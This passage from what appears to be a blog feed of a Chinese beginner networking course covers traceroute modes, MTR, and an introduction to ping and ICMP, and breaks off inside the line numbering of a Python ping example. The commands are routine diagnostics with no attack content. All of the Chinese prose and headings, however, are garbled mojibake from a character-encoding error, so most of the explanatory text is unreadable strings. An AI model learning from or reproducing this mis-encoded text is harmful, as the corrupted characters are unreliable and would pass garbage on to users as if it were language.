class="hljs crmsh"><span class="hljs-number">1</span>  <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>  <span class="hljs-number">1</span> <span class="hljs-keyword">ms</span><br><span class="hljs-title">2</span>  * * *<br><span class="hljs-number">3</span>  * * *<br><span class="hljs-number">4</span>  * * *<br>...<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šä»£ç æ‰©å±•">ç»ƒä¹ 4ï¼šä»£ç æ‰©å±•</h3><p>æ‰©å±•tracerouteå·¥å…·ï¼š</p><ol><li>æ·»åŠ è·¯å¾„å¯è§†åŒ–ï¼ˆç»˜åˆ¶è·¯ç”±å›¾ï¼‰</li><li>æ”¯æŒåŒæ—¶è¿½è¸ªå¤šä¸ªç›®æ ‡</li><li>è®°å½•å†å²è·¯å¾„ï¼Œå¯¹æ¯”è·¯å¾„å˜åŒ–</li><li>æ·»åŠ ASå·æŸ¥è¯¢ï¼ˆè‡ªæ²»ç³»ç»Ÿå·ï¼‰</li></ol><h3 id="ç»ƒä¹ 5ï¼šæ€è€ƒé¢˜">ç»ƒä¹ 5ï¼šæ€è€ƒé¢˜</h3><ol><li>ä¸ºä»€ä¹ˆå»ç¨‹å’Œå›ç¨‹è·¯å¾„å¯èƒ½ä¸åŒï¼Ÿ</li><li>tracerouteèƒ½ç”¨æ¥æ”»å‡»å—ï¼Ÿ</li><li>å¦‚ä½•é˜»æ­¢åˆ«äººtracerouteä½ çš„æœåŠ¡å™¨ï¼Ÿ</li></ol><h2 id="ğŸ“š-æ‰©å±•é˜…è¯»">ğŸ“š æ‰©å±•é˜…è¯»</h2><h3 id="tracerouteçš„ä¸åŒå®ç°æ–¹å¼">tracerouteçš„ä¸åŒå®ç°æ–¹å¼</h3><h4 id="1-UDPæ–¹å¼ï¼ˆLinuxé»˜è®¤ï¼‰">1. UDPæ–¹å¼ï¼ˆLinuxé»˜è®¤ï¼‰</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨UDPåŒ…ï¼Œç›®æ ‡ç«¯å£ä»33434å¼€å§‹é€’å¢</span><br>traceroute baidu.com<br><br>å·¥ä½œåŸç†ï¼š<br>- å‘é€UDPåŒ…åˆ°ä¸å¸¸ç”¨çš„ç«¯å£<br>- ä¸­é—´è·¯ç”±å™¨ï¼šè¿”å›ICMP Time Exceeded<br>- ç›®æ ‡ä¸»æœºï¼šè¿”å›ICMP Port Unreachable<br></code></pre></td></tr></table></figure><h4 id="2-ICMPæ–¹å¼ï¼ˆWindowsé»˜è®¤ï¼‰">2. ICMPæ–¹å¼ï¼ˆWindowsé»˜è®¤ï¼‰</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨ICMP Echo Request</span><br>traceroute -I baidu.com  <span class="hljs-comment"># Linux</span><br>tracert baidu.com        <span class="hljs-comment"># Windows</span><br><br>å·¥ä½œåŸç†ï¼š<br>- å‘é€ICMP Echo Request<br>- ä¸­é—´è·¯ç”±å™¨ï¼šè¿”å›ICMP Time Exceeded<br>- ç›®æ ‡ä¸»æœºï¼šè¿”å›ICMP Echo Reply<br></code></pre></td></tr></table></figure><h4 id="3-TCPæ–¹å¼">3. TCPæ–¹å¼</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨TCP SYNåŒ…ï¼ˆéœ€è¦æŒ‡å®šç«¯å£ï¼‰</span><br>traceroute -T -p 80 baidu.com<br><br>å·¥ä½œåŸç†ï¼š<br>- å‘é€TCP SYNåŒ…åˆ°æŒ‡å®šç«¯å£<br>- ä¸­é—´è·¯ç”±å™¨ï¼šè¿”å›ICMP Time Exceeded<br>- ç›®æ ‡ä¸»æœºï¼šè¿”å›TCP SYN+ACK<br></code></pre></td></tr></table></figure><h3 id="MTRï¼šå¢å¼ºç‰ˆtraceroute">MTRï¼šå¢å¼ºç‰ˆtraceroute</h3><p>MTRï¼ˆMy Tracerouteï¼‰ç»“åˆäº†pingå’Œtracerouteçš„åŠŸèƒ½ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…</span><br><span class="hljs-built_in">sudo</span> apt install mtr      <span class="hljs-comment"># Ubuntu/Debian</span><br>brew install mtr          <span class="hljs-comment"># Mac</span><br><br><span class="hljs-comment"># ä½¿ç”¨</span><br><span class="hljs-built_in">sudo</span> mtr baidu.com<br></code></pre></td></tr></table></figure><p><strong>MTRçš„ä¼˜åŠ¿</strong>ï¼š</p><ul><li>å®æ—¶æ›´æ–°</li><li>æ˜¾ç¤ºä¸¢åŒ…ç‡</li><li>æ˜¾ç¤ºæ¯ä¸€è·³çš„ç»Ÿè®¡ä¿¡æ¯</li><li>æ›´ç›´è§‚çš„ç•Œé¢</li></ul><h3 id="è·¯ç”±çš„å˜åŒ–">è·¯ç”±çš„å˜åŒ–</h3><p>äº’è”ç½‘çš„è·¯ç”±ä¸æ˜¯å›ºå®šçš„ï¼Œä¼šå› ä¸ºä»¥ä¸‹åŸå› å˜åŒ–ï¼š</p><ol><li><strong>è´Ÿè½½å‡è¡¡</strong>ï¼šåˆ†æ•£æµé‡åˆ°ä¸åŒè·¯å¾„</li><li><strong>è·¯ç”±ç­–ç•¥</strong>ï¼šè¿è¥å•†åŠ¨æ€è°ƒæ•´è·¯ç”±</li><li><strong>æ•…éšœåˆ‡æ¢</strong>ï¼šæŸæ¡çº¿è·¯æ•…éšœæ—¶è‡ªåŠ¨åˆ‡æ¢</li><li><strong>æ—¶é—´å› ç´ </strong>ï¼šä¸åŒæ—¶æ®µå¯èƒ½èµ°ä¸åŒè·¯ç”±</li></ol><h3 id="å®é™…åº”ç”¨åœºæ™¯">å®é™…åº”ç”¨åœºæ™¯</h3><ol><li><p><strong>ç½‘ç»œæ•…éšœè¯Šæ–­</strong>ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">æƒ…å†µï¼šç½‘ç«™è®¿é—®å¾ˆæ…¢<br>æ­¥éª¤ï¼štraceroute æŸ¥çœ‹å“ªä¸€è·³å»¶è¿Ÿé«˜<br>ç»“æœï¼šå®šä½ç“¶é¢ˆæ‰€åœ¨<br></code></pre></td></tr></table></figure></li><li><p><strong>CDNæ£€æµ‹</strong>ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">æƒ…å†µï¼šæƒ³çŸ¥é“è®¿é—®çš„æ˜¯å“ªä¸ªCDNèŠ‚ç‚¹<br>æ­¥éª¤ï¼štraceroute æŸ¥çœ‹æœ€åå‡ è·³<br>ç»“æœï¼šå‘ç°CDNåœ¨æœ¬åœ°ï¼Œå»¶è¿Ÿä½<br></code></pre></td></tr></table></figure></li><li><p><strong>ç½‘ç»œæ‹“æ‰‘å‘ç°</strong>ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">æƒ…å†µï¼šæƒ³äº†è§£å…¬å¸ç½‘ç»œç»“æ„<br>æ­¥éª¤ï¼štraceroute åˆ°ä¸åŒå†…ç½‘åœ°å€<br>ç»“æœï¼šç»˜åˆ¶ç½‘ç»œæ‹“æ‰‘å›¾<br></code></pre></td></tr></table></figure></li></ol><h3 id="æœ‰è¶£çš„å‘ç°">æœ‰è¶£çš„å‘ç°</h3><p><strong>åœ°ç†ä½ç½®ä¸å»¶è¿Ÿ</strong>ï¼š</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">æœ¬åœ°è·¯ç”±å™¨ï¼š    <span class="hljs-number">1</span>-<span class="hljs-number">2</span> <span class="hljs-keyword">ms</span><br><span class="hljs-title">åŒåŸæœåŠ¡å™¨ï¼š    10-30</span> <span class="hljs-keyword">ms</span><br><span class="hljs-title">ç›¸é‚»çœä»½ï¼š      30-60</span> <span class="hljs-keyword">ms</span><br><span class="hljs-title">è·¨å›½è¿æ¥ï¼š      100-300</span> <span class="hljs-keyword">ms</span><br><span class="hljs-title">å…¨çƒå¦ä¸€ç«¯ï¼š    300-500</span> ms<br></code></pre></td></tr></table></figure><p><strong>å…‰é€Ÿçš„é™åˆ¶</strong>ï¼š</p><ul><li>å…‰åœ¨å…‰çº¤ä¸­çš„é€Ÿåº¦çº¦ä¸º 200,000 km/s</li><li>åœ°çƒå‘¨é•¿çº¦ 40,000 km</li><li>ç†è®ºä¸Šç¯ç»•åœ°çƒä¸€åœˆè‡³å°‘éœ€è¦ 200ms</li><li>å®é™…å»¶è¿Ÿä¼šæ›´é«˜ï¼ˆè·¯ç”±å™¨å¤„ç†æ—¶é—´ï¼‰</li></ul><h2 id="ğŸ¯-æ˜å¤©é¢„å‘Š">ğŸ¯ æ˜å¤©é¢„å‘Š</h2><p><strong>ç¬¬7å¤©ï¼šWiresharkæŠ“åŒ…å…¥é—¨</strong></p><p>æˆ‘ä»¬å°†å­¦ä¹ ï¼š</p><ul><li>Wiresharkçš„åŸºæœ¬ä½¿ç”¨</li><li>å¦‚ä½•æ•è·å’Œåˆ†ææ•°æ®åŒ…</li><li>è¿‡æ»¤å™¨çš„ä½¿ç”¨æŠ€å·§</li><li>å®æˆ˜ï¼šåˆ†æHTTPè¯·æ±‚è¿‡ç¨‹</li></ul><hr><p>ğŸ’¡ <strong>ä»Šæ—¥é‡‘å¥</strong>ï¼šè¿½è¸ªè·¯ç”±ï¼Œå°±åƒåœ¨äº’è”ç½‘ä¸Šå¯»æ‰¾å®è—çš„åœ°å›¾ï¼</p><p>ğŸ‘‰ <a href="day05.md">ä¸Šä¸€å¤©ï¼špingå‘½ä»¤è¯¦è§£</a> | <a href="../../README.md">è¿”å›ç›®å½•</a> | <a href="day07.md">ä¸‹ä¸€å¤©ï¼šWiresharkæŠ“åŒ…å…¥é—¨</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>5å¤©ï¼šç½‘ç»œå‘½ä»¤å…¥é—¨ - ping</title>
    <link href="/2025/11/10/5%E5%A4%A9%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8%20-%20ping/"/>
    <url>/2025/11/10/5%E5%A4%A9%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8%20-%20ping/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬5å¤©ï¼šç½‘ç»œå‘½ä»¤å…¥é—¨ - ping</h1><blockquote><p>â€œpingä¸€ä¸‹ï¼Œç½‘ç»œé€šä¸é€šç«‹åˆ»çŸ¥é“ã€‚â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡">ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£pingå‘½ä»¤çš„å·¥ä½œåŸç†</li><li>æŒæ¡ICMPåè®®åŸºç¡€çŸ¥è¯†</li><li>å­¦ä¼šä½¿ç”¨pingå‘½ä»¤è¿›è¡Œç½‘ç»œè¯Šæ–­</li><li>ç¼–å†™è‡ªå·±çš„pingå·¥å…·</li></ul><h2 id="ğŸ¯-ä»€ä¹ˆæ˜¯pingï¼Ÿ">ğŸ¯ ä»€ä¹ˆæ˜¯pingï¼Ÿ</h2><h3 id="ç”Ÿæ´»ä¸­çš„ä¾‹å­">ç”Ÿæ´»ä¸­çš„ä¾‹å­</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">ping</span> <span class="hljs-operator">=</span> å–Šè¯æ¸¸æˆ<br><br>ä½ ï¼šå–‚ï¼èƒ½å¬åˆ°å—ï¼Ÿ ï¼ˆå‘é€ï¼‰<br>æœ‹å‹ï¼šèƒ½å¬åˆ°ï¼         ï¼ˆå›åº”ï¼‰<br>ä½ ï¼šå¤ªå¥½äº†ï¼Œé€šä¿¡æ­£å¸¸ï¼ ï¼ˆç¡®è®¤ï¼‰<br></code></pre></td></tr></table></figure><p><strong>pingå‘½ä»¤</strong>å°±æ˜¯ç”¨æ¥æµ‹è¯•ç½‘ç»œè¿é€šæ€§çš„å·¥å…·ï¼Œå®ƒä¼šå‘é€ä¸€ä¸ªæ•°æ®åŒ…åˆ°ç›®æ ‡ä¸»æœºï¼Œç„¶åç­‰å¾…å›åº”ã€‚</p><h3 id="pingçš„ä½œç”¨">pingçš„ä½œç”¨</h3><ol><li><strong>æµ‹è¯•è¿é€šæ€§</strong>ï¼šç›®æ ‡ä¸»æœºæ˜¯å¦å¯è¾¾</li><li><strong>æµ‹é‡å»¶è¿Ÿ</strong>ï¼šæ•°æ®å¾€è¿”éœ€è¦å¤šå°‘æ—¶é—´</li><li><strong>æ£€æµ‹ä¸¢åŒ…</strong>ï¼šæœ‰å¤šå°‘æ•°æ®åŒ…ä¸¢å¤±äº†</li><li><strong>è¯Šæ–­ç½‘ç»œé—®é¢˜</strong>ï¼šå®šä½ç½‘ç»œæ•…éšœ</li></ol><h2 id="ğŸ“¡-ICMPåè®®">ğŸ“¡ ICMPåè®®</h2><h3 id="ä»€ä¹ˆæ˜¯ICMPï¼Ÿ">ä»€ä¹ˆæ˜¯ICMPï¼Ÿ</h3><p><strong>ICMP</strong>ï¼ˆInternet Control Message Protocolï¼Œäº’è”ç½‘æ§åˆ¶æ¶ˆæ¯åè®®ï¼‰æ˜¯TCP/IPåè®®æ—çš„ä¸€éƒ¨åˆ†ï¼Œå·¥ä½œåœ¨ç½‘é™…å±‚ï¼ˆIPå±‚ï¼‰ã€‚</p><h3 id="ICMPçš„ä½œç”¨">ICMPçš„ä½œç”¨</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">ICMP</span> <span class="hljs-operator">=</span> ç½‘ç»œçš„<span class="hljs-string">&quot;é€šè®¯å‘˜&quot;</span><br><br>ä¸»è¦ä»»åŠ¡ï¼š<br><span class="hljs-number">1</span>. æŠ¥å‘Šé”™è¯¯ï¼ˆ<span class="hljs-string">&quot;å¯¹æ–¹ä¸åœ¨å®¶&quot;</span>ï¼‰<br><span class="hljs-number">2</span>. è¯Šæ–­é—®é¢˜ï¼ˆ<span class="hljs-string">&quot;pingæµ‹è¯•&quot;</span>ï¼‰<br><span class="hljs-number">3</span>. æä¾›åé¦ˆï¼ˆ<span class="hljs-string">&quot;è¶…æ—¶äº†&quot;</span>ï¼‰<br></code></pre></td></tr></table></figure><h3 id="å¸¸è§çš„ICMPæ¶ˆæ¯ç±»å‹">å¸¸è§çš„ICMPæ¶ˆæ¯ç±»å‹</h3><table><thead><tr><th>ç±»å‹</th><th>åç§°</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>0</td><td>Echo Reply</td><td>pingçš„å›åº”</td></tr><tr><td>3</td><td>Destination Unreachable</td><td>ç›®æ ‡ä¸å¯è¾¾</td></tr><tr><td>5</td><td>Redirect</td><td>é‡å®šå‘</td></tr><tr><td>8</td><td>Echo Request</td><td>pingçš„è¯·æ±‚</td></tr><tr><td>11</td><td>Time Exceeded</td><td>è¶…æ—¶ï¼ˆTTL=0ï¼‰</td></tr></tbody></table><h2 id="ğŸ”-pingçš„å·¥ä½œåŸç†">ğŸ” pingçš„å·¥ä½œåŸç†</h2><h3 id="å®Œæ•´æµç¨‹">å®Œæ•´æµç¨‹</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>. å‘é€ ICMP Echo Requestï¼ˆç±»å‹<span class="hljs-number">8</span>ï¼‰<br>   ä½ çš„ç”µè„‘ â†’ ç›®æ ‡ä¸»æœº<br>   &quot;ä½ å¥½ï¼Œæˆ‘æ˜¯<span class="hljs-number">192.168.1.100</span>ï¼Œè¯·å›åº”ï¼&quot;<br><br><span class="hljs-number">2</span>. æ¥æ”¶ ICMP Echo Replyï¼ˆç±»å‹<span class="hljs-number">0</span>ï¼‰<br>   ç›®æ ‡ä¸»æœº â†’ ä½ çš„ç”µè„‘<br>   &quot;æ”¶åˆ°ï¼æˆ‘æ˜¯<span class="hljs-number">8.8.8.8</span>ï¼Œä¸€åˆ‡æ­£å¸¸ï¼&quot;<br><br><span class="hljs-number">3</span>. è®¡ç®—RTTï¼ˆå¾€è¿”æ—¶é—´ï¼‰<br>   å‘é€æ—¶é—´ï¼š<span class="hljs-number">10</span>:<span class="hljs-number">00:00.000</span><br>   æ¥æ”¶æ—¶é—´ï¼š<span class="hljs-number">10</span>:<span class="hljs-number">00:00.050</span><br>   RTT = <span class="hljs-number">50</span>æ¯«ç§’<br></code></pre></td></tr></table></figure><h3 id="RTTï¼ˆRound-Trip-Timeï¼‰">RTTï¼ˆRound-Trip Timeï¼‰</h3><p><strong>RTT</strong>ï¼šæ•°æ®åŒ…ä»å‘é€åˆ°æ”¶åˆ°å›å¤çš„æ€»æ—¶é—´</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">RTT = å»ç¨‹æ—¶é—´ + å›ç¨‹æ—¶é—´<br><br>å½±å“RTTçš„å› ç´ ï¼š<br><span class="hljs-bullet">- </span>ç‰©ç†è·ç¦»ï¼ˆå…‰é€Ÿæ˜¯æœ‰é™çš„ï¼‰<br><span class="hljs-bullet">- </span>ç½‘ç»œæ‹¥å¡<br><span class="hljs-bullet">- </span>è·¯ç”±å™¨å¤„ç†æ—¶é—´<br><span class="hljs-bullet">- </span>å¯¹æ–¹æœåŠ¡å™¨å¤„ç†æ—¶é—´<br></code></pre></td></tr></table></figure><h3 id="ICMPæŠ¥æ–‡ç»“æ„">ICMPæŠ¥æ–‡ç»“æ„</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ICMP Echo Request/Reply æ ¼å¼ï¼š<br><br><span class="hljs-section">0               8              16              24              31</span><br><span class="hljs-section">+---------------+---------------+---------------+---------------+</span><br>|     ç±»å‹      |     ä»£ç       |           æ ¡éªŒå’Œ              |<br><span class="hljs-section">|   (Type)      |   (Code)      |         (Checksum)            |</span><br><span class="hljs-section">+---------------+---------------+---------------+---------------+</span><br><span class="hljs-section">|          æ ‡è¯†ç¬¦ (Identifier)   |      åºåˆ—å· (Sequence)        |</span><br><span class="hljs-section">+---------------+---------------+---------------+---------------+</span><br>|                         æ•°æ® (Data)                            |<br><span class="hljs-section">|                         å¯é€‰ï¼Œç”¨äºå¡«å……                         |</span><br><span class="hljs-section">+---------------+---------------+---------------+---------------+</span><br><br>å­—æ®µè¯´æ˜ï¼š<br><span class="hljs-bullet">- </span>ç±»å‹ï¼š8=è¯·æ±‚ï¼Œ0=å›åº”<br><span class="hljs-bullet">- </span>ä»£ç ï¼šé€šå¸¸ä¸º0<br><span class="hljs-bullet">- </span>æ ¡éªŒå’Œï¼šç”¨äºæ£€æµ‹æ•°æ®å®Œæ•´æ€§<br><span class="hljs-bullet">- </span>æ ‡è¯†ç¬¦ï¼šæ ‡è¯†è¿™ä¸ªpingè¿›ç¨‹<br><span class="hljs-bullet">- </span>åºåˆ—å·ï¼šæ ‡è¯†è¿™æ˜¯ç¬¬å‡ ä¸ªåŒ…<br><span class="hljs-bullet">- </span>æ•°æ®ï¼šå¯é€‰çš„è´Ÿè½½æ•°æ®<br></code></pre></td></tr></table></figure><h2 id="ğŸ”§-ä½¿ç”¨pingå‘½ä»¤">ğŸ”§ ä½¿ç”¨pingå‘½ä»¤</h2><h3 id="åŸºæœ¬ç”¨æ³•">åŸºæœ¬ç”¨æ³•</h3><p><strong>Windows</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åŸºæœ¬ping</span><br>ping baidu.com<br><br><span class="hljs-comment"># ping 4æ¬¡ååœæ­¢</span><br>ping -n 4 baidu.com<br><br><span class="hljs-comment"># æŒ‡å®šåŒ…å¤§å°ï¼ˆå­—èŠ‚ï¼‰</span><br>ping -l 1000 baidu.com<br><br><span class="hljs-comment"># æŒç»­ping</span><br>ping -t baidu.com<br></code></pre></td></tr></table></figure><p><strong>Linux/Mac</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åŸºæœ¬ping</span><br>ping baidu.com<br><br><span class="hljs-comment"># ping 4æ¬¡ååœæ­¢</span><br>ping -c 4 baidu.com<br><br><span class="hljs-comment"># æŒ‡å®šåŒ…å¤§å°ï¼ˆå­—èŠ‚ï¼‰</span><br>ping -s 1000 baidu.com<br><br><span class="hljs-comment"># å¿«é€Ÿpingï¼ˆé—´éš”0.2ç§’ï¼‰</span><br>ping -i 0.2 baidu.com<br></code></pre></td></tr></table></figure><h3 id="è¾“å‡ºè§£æ">è¾“å‡ºè§£æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ping baidu.com<br><br>PING baidu.com (220.181.38.148): 56 data bytes<br>64 bytes from 220.181.38.148: icmp_seq=0 ttl=52 <span class="hljs-keyword">time</span>=28.5 ms<br>64 bytes from 220.181.38.148: icmp_seq=1 ttl=52 <span class="hljs-keyword">time</span>=27.8 ms<br>64 bytes from 220.181.38.148: icmp_seq=2 ttl=52 <span class="hljs-keyword">time</span>=28.1 ms<br>64 bytes from 220.181.38.148: icmp_seq=3 ttl=52 <span class="hljs-keyword">time</span>=29.2 ms<br><br>--- baidu.com ping statistics ---<br>4 packets transmitted, 4 packets received, 0.0% packet loss<br>round-trip min/avg/max/stddev = 27.8/28.4/29.2/0.5 ms<br></code></pre></td></tr></table></figure><p><strong>å­—æ®µå«ä¹‰</strong>ï¼š</p><ul><li><code>64 bytes</code>ï¼šæ•°æ®åŒ…å¤§å°</li><li><code>icmp_seq</code>ï¼šåºåˆ—å·ï¼ˆç¬¬å‡ ä¸ªåŒ…ï¼‰</li><li><code>ttl=52</code>ï¼šç”Ÿå­˜æ—¶é—´ï¼ˆç»è¿‡äº†64-52=12ä¸ªè·¯ç”±å™¨ï¼‰</li><li><code>time=28.5 ms</code>ï¼šRTTå¾€è¿”æ—¶é—´</li><li><code>0.0% packet loss</code>ï¼šä¸¢åŒ…ç‡</li><li><code>min/avg/max</code>ï¼šæœ€å°/å¹³å‡/æœ€å¤§RTT</li></ul><h2 id="ğŸ”§-å®æˆ˜é¡¹ç›®ï¼šå®ç°ç®€æ˜“pingå·¥å…·">ğŸ”§ å®æˆ˜é¡¹ç›®ï¼šå®ç°ç®€æ˜“pingå·¥å…·</h2><p>è®©æˆ‘ä»¬ç”¨Pythonå®ç°ä¸€ä¸ªç®€å•çš„pingå·¥å…·ï¼</p><h3 id="ä»£ç å®ç°">ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span 